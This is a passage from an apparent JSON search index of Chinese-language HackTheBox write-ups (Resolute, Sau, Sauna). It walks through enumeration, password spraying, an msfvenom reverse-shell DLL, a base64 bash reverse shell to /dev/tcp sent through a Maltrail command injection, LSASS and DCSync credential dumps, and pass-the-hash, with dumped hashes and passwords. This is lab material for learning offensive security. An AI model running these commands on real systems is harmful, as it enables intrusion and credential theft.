Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 (88%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Embedded Standard 7 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery: \n|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)\n|   OS CPE: cpe:/o:microsoft:windows_server_2012::-\n|   Computer name: REEL\n|   NetBIOS computer name: REEL\\x00\n|   Domain name: HTB.LOCAL\n|   Forest name: HTB.LOCAL\n|   FQDN: REEL.HTB.LOCAL\n|_  System time: 2024-01-15T09:28:22+00:00\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n| smb2-security-mode: \n|   3:0:2: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2024-01-15T09:28:26\n|_  start_date: 2024-01-15T09:20:27\n</code></pre> - <code>crackmapexec smb $IP -u guest -p '' --shares</code> </p> <ul> <li>ftp \u53d1\u73b0\u591a\u4e2a\u6587\u4ef6 </li> </ul>"}, {"location": "HackTheBox/Machines/Resolute/", "title": "Resolute", "text": ""}, {"location": "HackTheBox/Machines/Resolute/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.10.169 - <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code> <pre><code>PORT      STATE  SERVICE      VERSION\n88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-12 07:55:38Z)\n135/tcp   open   msrpc        Microsoft Windows RPC\n139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\n445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)\n464/tcp   open   kpasswd5?\n593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp   open   tcpwrapped\n3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\n3269/tcp  open   tcpwrapped\n5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open   mc-nmf       .NET Message Framing\n47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open   msrpc        Microsoft Windows RPC\n49665/tcp open   msrpc        Microsoft Windows RPC\n49666/tcp open   msrpc        Microsoft Windows RPC\n49667/tcp open   msrpc        Microsoft Windows RPC\n49671/tcp open   msrpc        Microsoft Windows RPC\n49678/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0\n49679/tcp open   msrpc        Microsoft Windows RPC\n49684/tcp open   msrpc        Microsoft Windows RPC\n49707/tcp closed unknown\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\n...\nNetwork Distance: 2 hops\nService Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery: \n|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n|   Computer name: Resolute\n|   NetBIOS computer name: RESOLUTE\\x00\n|   Domain name: megabank.local\n|   Forest name: megabank.local\n|   FQDN: Resolute.megabank.local\n|_  System time: 2024-01-11T23:56:51-08:00\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2024-01-12T07:56:52\n|_  start_date: 2024-01-12T07:52:54\n|_clock-skew: mean: 2h47m00s, deviation: 4h37m09s, median: 6m59s\n</code></pre> - <code>crackmapexec smb $IP -u guest -p '' --shares</code>  - <code>ldapsearch</code> <pre><code>ldapsearch -x -H \"ldap://$IP\" -s base namingContexts\n---\ndn:\nnamingContexts: DC=megabank,DC=local\nnamingContexts: CN=Configuration,DC=megabank,DC=local\nnamingContexts: CN=Schema,CN=Configuration,DC=megabank,DC=local\nnamingContexts: DC=DomainDnsZones,DC=megabank,DC=local\nnamingContexts: DC=ForestDnsZones,DC=megabank,DC=local\n\nldapsearch -x -H \"ldap://$IP\" -b \"DC=megabank,DC=local\" &gt; ldap_megabank_local.txt\ncat ldap_megabank_local.txt | grep userPrincipalName\n---\nuserPrincipalName: ryan@megabank.local\nuserPrincipalName: marko@megabank.local\nuserPrincipalName: sunita@megabank.local\nuserPrincipalName: abigail@megabank.local\nuserPrincipalName: marcus@megabank.local\nuserPrincipalName: sally@megabank.local\nuserPrincipalName: fred@megabank.local\nuserPrincipalName: angela@megabank.local\nuserPrincipalName: felicia@megabank.local\nuserPrincipalName: gustavo@megabank.local\nuserPrincipalName: ulf@megabank.local\nuserPrincipalName: stevie@megabank.local\nuserPrincipalName: claire@megabank.local\nuserPrincipalName: paulo@megabank.local\nuserPrincipalName: steve@megabank.local\nuserPrincipalName: annette@megabank.local\nuserPrincipalName: annika@megabank.local\nuserPrincipalName: per@megabank.local\nuserPrincipalName: claude@megabank.local\nuserPrincipalName: melanie@megabank.local\nuserPrincipalName: zach@megabank.local\nuserPrincipalName: simon@megabank.local\nuserPrincipalName: naoki@megabank.local\n\ncat ldap_megabank_local.txt | grep 'OU=Service Accounts'\ncat ldap_megabank_local.txt | grep assw\n---\n...\nbadPasswordTime: 0\ndescription: Account created. Password set to Welcome123!\nbadPasswordTime: 0\n...\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Resolute/#shell-as-user-melanie", "title": "Shell as User - melanie", "text": "<ul> <li>\u5bc6\u7801\u55b7\u5c04 </li> <li><code>evil-winrm -i $IP -u 'melanie' -p 'Welcome123!'</code> </li> </ul>"}, {"location": "HackTheBox/Machines/Resolute/#shell-as-user-ryan", "title": "Shell as User - ryan", "text": "<ul> <li>\u905b\u72d7\uff0c\u53d1\u73b0\u8fd9\u4e2a\u7528\u6237\u6ca1\u5565\u6743\u9650 </li> <li>\u8dd1\u4e00\u4e0b WinPeas \u6ca1\u6709\u53ef\u5229\u7528\u7684\u4fe1\u606f</li> <li>\u67e5\u770b\u672c\u5730\u6587\u4ef6\uff0c\u53d1\u73b0 PSTranscripts \u76ee\u5f55 </li> <li>\u53d1\u73b0 ryan \u7528\u6237\u51ed\u636e </li> <li><code>evil-winrm -i $IP -u ryan -p 'Serv3r4Admin4cc123!'</code> </li> <li>\u53d1\u73b0\u6b64\u7528\u6237\u4e3a DNS \u7ba1\u7406\u5458 </li> </ul>"}, {"location": "HackTheBox/Machines/Resolute/#shell-as-root", "title": "Shell as Root", "text": "<p>ryan \u662f DNS \u7ba1\u7406\u5458\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528 dnscmd.exe \u6307\u5b9a\u5e94\u7531 DNS \u52a0\u8f7d\u7684\u63d2\u4ef6 DLL \u53cd\u5f39 Shell - \u751f\u6210 reverse shell dll \u6587\u4ef6 <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.18 LPORT=2233 -f dll -o good.dll</code> - \u542f\u52a8 smb \u670d\u52a1  - \u5229\u7528 dnscmd.exe \u52a0\u8f7d good.dll\uff0c\u91cd\u542f\u670d\u52a1\u83b7\u53d6 shell <pre><code>dnscmd.exe localhost /config /serverlevelplugindll \\\\10.10.16.18\\good\\good.dll\nsc.exe stop dns\nsc.exe start dns\n</code></pre> </p>"}, {"location": "HackTheBox/Machines/Resolute/#dump-hash", "title": "Dump Hash", "text": "<ul> <li>\u6dfb\u52a0\u57df\u7ba1 <pre><code>net user newboy Admin@123 /add /domain\nnet group \"domain admins\" newboy /add /domain\n</code></pre></li> <li><code>lsassy megabank.local -u newboy -p 'Admin@123' -dc-ip $IP</code> <pre><code>[+] megabank.local Authentication successful\n[+] megabank.local Lsass dumped in C:\\Windows\\Temp\\jY2.sys (148886946 Bytes)\n[+] megabank.local Lsass dump deleted\n[+] megabank.local MEGABANK\\RESOLUTE$            [NT] 84ab27f4fa73cd812c44dd4f3c141f6c | [SHA1] a1bb1366976dc62859f90e015ded4509cb2c46cc\n[+] megabank.local MEGABANK\\Administrator        [NT] fb3b106896cdaa8a08072775fbd9afe9 | [SHA1] 03006b77aacca0a1e25f4134c6e2f1ef13a82a19\n[+] megabank.local megabank.local\\Administrator  [PWD] DontH4ckUsPleeze!\n</code></pre></li> </ul>"}, {"location": "HackTheBox/Machines/Sau/", "title": "Sau", "text": ""}, {"location": "HackTheBox/Machines/Sau/#recon", "title": "Recon", "text": "<ul> <li><code>nmap -sC -A -p- --min-rate 1000 -T4 10.10.11.224</code> <pre><code># Nmap 7.94SVN scan initiated Tue Jan  2 09:35:58 2024 as: nmap -sC -A -p22,80,8338,55555, -oN nmap.txt --append-out 10.10.11.224\nNmap scan report for 10.10.11.224\nHost is up (0.22s latency).\n\nPORT      STATE    SERVICE VERSION\n22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)\n|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)\n|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)\n80/tcp    filtered http\n8338/tcp  filtered unknown\n55555/tcp open     unknown\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.0 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     X-Content-Type-Options: nosniff\n|     Date: Tue, 02 Jan 2024 01:36:46 GMT\n|     Content-Length: 75\n|     invalid basket name; the name does not match pattern: ^[wd-_\\.]{1,250}$\n|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest: \n|     HTTP/1.0 302 Found\n|     Content-Type: text/html; charset=utf-8\n|     Location: /web\n|     Date: Tue, 02 Jan 2024 01:36:15 GMT\n|     Content-Length: 27\n|     href=\"/web\"&gt;Found&lt;/a&gt;.\n|   HTTPOptions: \n|     HTTP/1.0 200 OK\n|     Allow: GET, OPTIONS\n|     Date: Tue, 02 Jan 2024 01:36:16 GMT\n|_    Content-Length: 0\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port55555-TCP:V=7.94SVN%I=7%D=1/2%Time=6593688F%P=x86_64-pc-linux-gnu%r\nSF:(GetRequest,A2,\"HTTP/1\\.0\\x20302\\x20Found\\r\\nContent-Type:\\x20text/html\nSF:;\\x20charset=utf-8\\r\\nLocation:\\x20/web\\r\\nDate:\\x20Tue,\\x2002\\x20Jan\\x\nSF:202024\\x2001:36:15\\x20GMT\\r\\nContent-Length:\\x2027\\r\\n\\r\\n&lt;a\\x20href=\\\"\nSF:/web\\\"&gt;Found&lt;/a&gt;\\.\\n\\n\")%r(GenericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20\nSF:Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\nSF:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(HTTPOptions,60,\"HTTP/1\\.0\\x2\nSF:0200\\x20OK\\r\\nAllow:\\x20GET,\\x20OPTIONS\\r\\nDate:\\x20Tue,\\x2002\\x20Jan\\x\nSF:202024\\x2001:36:16\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSPReque\nSF:st,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plai\nSF:n;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Reques\nSF:t\")%r(Help,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t\nSF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x\nSF:20Request\")%r(SSLSessionReq,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nC\nSF:ontent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\\nSF:n\\r\\n400\\x20Bad\\x20Request\")%r(TerminalServerCookie,67,\"HTTP/1\\.1\\x2040\nSF:0\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\\nSF:nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(TLSSessionReq,67\nSF:,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x2\nSF:0charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r\nSF:(Kerberos,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20te\nSF:xt/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x2\nSF:0Request\")%r(FourOhFourRequest,EA,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\nSF:\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nX-Content-Type-Optio\nSF:ns:\\x20nosniff\\r\\nDate:\\x20Tue,\\x2002\\x20Jan\\x202024\\x2001:36:46\\x20GMT\nSF:\\r\\nContent-Length:\\x2075\\r\\n\\r\\ninvalid\\x20basket\\x20name;\\x20the\\x20n\nSF:ame\\x20does\\x20not\\x20match\\x20pattern:\\x20\\^\\[\\\\w\\\\d\\\\-_\\\\\\.\\]{1,250}\\\nSF:$\\n\")%r(LPDString,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Typ\nSF:e:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x\nSF:20Bad\\x20Request\")%r(LDAPSearchReq,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Reque\nSF:st\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20c\nSF:lose\\r\\n\\r\\n400\\x20Bad\\x20Request\");\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT       ADDRESS\n1   259.59 ms 10.10.16.1\n2   185.75 ms 10.10.11.224\n</code></pre> \u53ea\u6709 22 \u548c 55555 \u53ef\u4ee5\u8bbf\u95ee</li> </ul>"}, {"location": "HackTheBox/Machines/Sau/#shell-as-user-puma", "title": "Shell as user - puma", "text": "<p>\u8bbf\u95ee 55555 \u7aef\u53e3  Request-Baskets\uff0c\u53ef\u4ee5\u5b9e\u73b0\u670d\u52a1\u7aef\u4ee3\u7406\u8bf7\u6c42\uff0c\u7ed3\u5408\u7aef\u53e3\u53d1\u73b0\uff0c\u8bbf\u95ee\u672c\u5730 80 \u7aef\u53e3\u3002  \u53d1\u73b0 Maltrail \u670d\u52a1v0.53  \u8be5\u7248\u672c\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\uff0c\u6f0f\u6d1e\u70b9\u5728 login \u8def\u5f84\uff0cpost \u8bf7\u6c42\u5305\u4e2d\u7684 username \u53c2\u6570</p> <p>https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py</p> <p>\u6784\u9020\u53cd\u5f39 shell <code>echo -e '/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.16.3/2233 0&gt;&amp;1\"' | base64</code> <pre><code>L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjMvMjIzMyAwPiYxIgo=\n</code></pre> \u4fee\u6539 Request-Baskets  \u53d1\u9001\u8bf7\u6c42 <pre><code>curl 'http://10.10.11.224:55555/70aohtj' --data 'username=;`echo+\"L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjMvMjIzMyAwPiYxJwo=\"+|+base64+-d+|+sh`'\n</code></pre> </p>"}, {"location": "HackTheBox/Machines/Sau/#shell-as-root", "title": "Shell as root", "text": "<p>\u67e5\u770b sudo \u6743\u9650 </p> <p>\u4f7f\u7528 <code>sudo /usr/bin/systemctl status trail.service</code> \u67e5\u770b\u670d\u52a1\u72b6\u6001\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>!/bin/bash</code> \u83b7\u5f97 shell </p>"}, {"location": "HackTheBox/Machines/Sau/#pass-hash", "title": "Pass Hash", "text": "<p><code>cat /etc/shadow</code> <pre><code>root:$6$4IguUssRBYl3/LvG$MfnFD1Y9saTrvw2OqA1VtqKxa7TsDt1kb2qsJw6inQ8GfmnqIrh32eqk9IMO4UR3fYG.TzbJeiFd7UOu1QlGR0:19461:0:99999:7:::\ndaemon:*:19367:0:99999:7:::\nbin:*:19367:0:99999:7:::\nsys:*:19367:0:99999:7:::\nsync:*:19367:0:99999:7:::\ngames:*:19367:0:99999:7:::\nman:*:19367:0:99999:7:::\nlp:*:19367:0:99999:7:::\nmail:*:19367:0:99999:7:::\nnews:*:19367:0:99999:7:::\nuucp:*:19367:0:99999:7:::\nproxy:*:19367:0:99999:7:::\nwww-data:*:19367:0:99999:7:::\nbackup:*:19367:0:99999:7:::\nlist:*:19367:0:99999:7:::\nirc:*:19367:0:99999:7:::\ngnats:*:19367:0:99999:7:::\nnobody:*:19367:0:99999:7:::\nsystemd-network:*:19367:0:99999:7:::\nsystemd-resolve:*:19367:0:99999:7:::\nsystemd-timesync:*:19367:0:99999:7:::\nmessagebus:*:19367:0:99999:7:::\nsyslog:*:19367:0:99999:7:::\n_apt:*:19367:0:99999:7:::\ntss:*:19367:0:99999:7:::\nuuidd:*:19367:0:99999:7:::\ntcpdump:*:19367:0:99999:7:::\nsshd:*:19367:0:99999:7:::\nlandscape:*:19367:0:99999:7:::\npollinate:*:19367:0:99999:7:::\nfwupd-refresh:*:19367:0:99999:7:::\nsystemd-coredump:!!:19461::::::\nlxd:!:19461::::::\npuma:$6$eB4LwfQg7IgQC38d$SktdHbU0gQAh0.BoRY36FHreH6xR073oHdRrk6hmvar4eZTnmkfxbUxsMBsaZMRm9XHYQF9hG4l5v6fefYdic/:19461:0:99999:7:::\n_laurel:!:19527::::::\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Sauna/", "title": "Sauna", "text": ""}, {"location": "HackTheBox/Machines/Sauna/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.10.175 - <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code> <pre><code>PORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title: Egotistical Bank :: Home\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-11 10:43:20Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         Microsoft Windows RPC\n49675/tcp open  msrpc         Microsoft Windows RPC\n49724/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019 (88%)\nAggressive OS guesses: Microsoft Windows Server 2019 (88%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2024-01-11T10:45:36\n|_  start_date: N/A\n|_clock-skew: 6h59m37s\n</code></pre> - <code>crackmapexec</code> <pre><code>crackmapexec smb -i $IP -u guest -p '' --rid-brute 10000\ncrackmapexec smb -i $IP -u guest -p '' --shares\n---\nNull\n</code></pre> - <code>ldpasearch</code> <pre><code>ldapsearch -H \"ldap://$IP\" -x -s base namingcontexts\n---\n# extended LDIF\n#\n# LDAPv3\n# base &lt;&gt; (default) with scope baseObject\n# filter: (objectclass=*)\n# requesting: namingcontexts \n#\n\n#\ndn:\nnamingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL\nnamingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL\nnamingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL\nnamingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL\nnamingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL\n\n# search result\nsearch: 2\nresult: 0 Success\n\n# numResponses: 2\n# numEntries: 1\n\nldapsearch -H \"ldap://$IP\" -x -b \"DC=EGOTISTICAL-BANK,DC=LOCAL\" &gt; ldap_EGOTISTICAL-BANK_local.log\ncat ldap_EGOTISTICAL-BANK_local.log | grep 'userPrincipalName\\|OU=Service Accounts'\n</code></pre> - Get User <pre><code>impacket-GetADUsers EGOTISTICAL-BANK.local/ -dc-ip 10.10.10.175 \nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Querying 10.10.10.175 for information about domain.\nName                  Email                           PasswordLastSet      LastLogon           \n--------------------  ------------------------------  -------------------  -------------------\n</code></pre></p> <p>\u6ca1\u6709\u679a\u4e3e\u5230\u7528\u6237\uff0c\u518d\u770b\u770b Web \u670d\u52a1</p> <ul> <li>fuzz <pre><code>ffuf -u http://egotistical-bank.local/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt\n</code></pre>  \u65e0\u7ed3\u679c</li> <li>\u5c1d\u8bd5\u722c\u53d6 Web \u9875\u9762\u5185\u5bb9 <pre><code>cewl http://egotistical-bank.local/ -w web_cewl.list\n400 \u591a\u884c\uff0c\u6709\u70b9\u591a\n</code></pre></li> <li>\u627e\u5230 about.html \u9875\u9762\uff0c\u731c\u6d4b\u56e2\u961f\u6210\u5458\u59d3\u540d\u4f5c\u4e3a\u7528\u6237  \u7b80\u5355\u5904\u7406\u4e00\u4e0b </li> <li>\u679a\u4e3e\u7528\u6237\u540d\uff0c\u5c1d\u8bd5 ASREP-Roasting\uff0c\u5931\u8d25\uff0c\u5c1d\u8bd5\u5176\u4ed6\u7ec4\u5408 </li> <li>\u518d\u6b21\u5c1d\u8bd5 ASREP-Roasting <pre><code>impacket-GetNPUsers -no-pass -usersfile user.list -dc-ip 10.10.10.175 egotistical-bank.local/\n---\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:85bd1f636ebf06b2629b4e5cd0ed4be8$032fc5134db8eb03fe5304ed672b33c8c9f9e0c5543d36dc7d9a309ef1d4f1cf86c21301663c939d51ec9eb7d310291905df8b84b351e108b8390aa803cf20a2147baab18d659cb80a93c3618335dc2120207cb06008888036cfb791617fcf7e21b032b559122553e5fad8a7c75712a01e81f24d9da72a46be032266717a59b96bd9a2d9e5ddda94ed9a1ea5ac76ac79b144febfa8c6efcffd3bb3b5498c229128c632980142aabf2a103348059dab5daf48c08f21c67dcc03582da75c23720d8f1c7b36d72100eabb6aab5cfdc0b911f526ef2b9069bcdcc5c1809830d9b8d55fb03d884d75fc906efef0f8e8f48ed15d89b3e9d2a6c474808eab1d194f96cb\n</code></pre></li> </ul>"}, {"location": "HackTheBox/Machines/Sauna/#shell-as-user-fsmith", "title": "Shell as User - FSmith", "text": "<ul> <li>\u7206\u7834 Hash <code>hashcat -m 18200 [krb5asrep hash] rockyou.txt</code> <pre><code>$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:85bd1f636ebf06b2629b4e5cd0ed4be8$032fc5134db8eb03fe5304ed672b33c8c9f9e0c5543d36dc7d9a309ef1d4f1cf86c21301663c939d51ec9eb7d310291905df8b84b351e108b8390aa803cf20a2147baab18d659cb80a93c3618335dc2120207cb06008888036cfb791617fcf7e21b032b559122553e5fad8a7c75712a01e81f24d9da72a46be032266717a59b96bd9a2d9e5ddda94ed9a1ea5ac76ac79b144febfa8c6efcffd3bb3b5498c229128c632980142aabf2a103348059dab5daf48c08f21c67dcc03582da75c23720d8f1c7b36d72100eabb6aab5cfdc0b911f526ef2b9069bcdcc5c1809830d9b8d55fb03d884d75fc906efef0f8e8f48ed15d89b3e9d2a6c474808eab1d194f96cb:Thestrokes23\n\nFSmith@EGOTISTICAL-BANK.LOCAL / Thestrokes23\n</code></pre></li> <li><code>evil-winrm -i $IP -u 'FSmith' -p 'Thestrokes23'</code> </li> <li>\u57df\u63a7\u4e3a SAUNA.EGOTISTICAL-BANK.LOCAL\uff0c\u5f00\u59cb\u905b\u72d7 <pre><code>bloodhound-python -c all -d 'EGOTISTICAL-BANK.LOCAL' -u 'FSmith' -p 'Thestrokes23' -dc EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175\n</code></pre></li> <li>\u9996\u5148\u627e\u5230\u80fd\u591f AS-REP Roastable \u7684\u7528\u6237\uff0c\u6807\u8bb0\u4e3a owned</li> <li>\u627e\u5230\u9ad8\u4ef7\u503c\u8def\u5f84  \u53d1\u73b0\u4e00\u4e2a\u7528\u6237\u5177\u6709 DCSync \u6743\u9650</li> <li>\u8dd1\u4e00\u4e0b winpeas  \u53d1\u73b0 <code>svc_loanmanager/Moneymakestheworldgoround!</code> \u81ea\u52a8\u767b\u5f55\u7684\u5bc6\u7801\uff0c\u521a\u597d\u8fd9\u4e2a\u7528\u6237\u6709 DCSync \u6743\u9650\uff0c\u767b\u5f55\u540e\u4e0d\u5bf9\uff0c\u5728 Users \u76ee\u5f55\u53d1\u73b0\u7528\u6237\u540d\u4e3a <code>svc_loanmgr</code> </li> </ul>"}, {"location": "HackTheBox/Machines/Sauna/#shell-as-root", "title": "Shell as Root", "text": "<ul> <li><code>impacket-secretsdump EGOTISTICALBANK/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175</code> <pre><code>Impacket v0.11.0 - Copyright 2023 Fortra\n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::\n...\n</code></pre></li> <li>PTH - Administrator <code>evil-winrm -i $IP -u administrator -H '823452073d75b9d1cf70ebdf86c7f98e'</code> </li> </ul>"}, {"location": "HackTheBox/Machines/Sauna/#dump-hash", "title": "Dump Hash", "text": "<p><code>impacket-secretsdump EGOTISTICALBANK/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175</code> <pre><code>Impacket v0.11.0 - Copyright 2023 Fortra\n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT 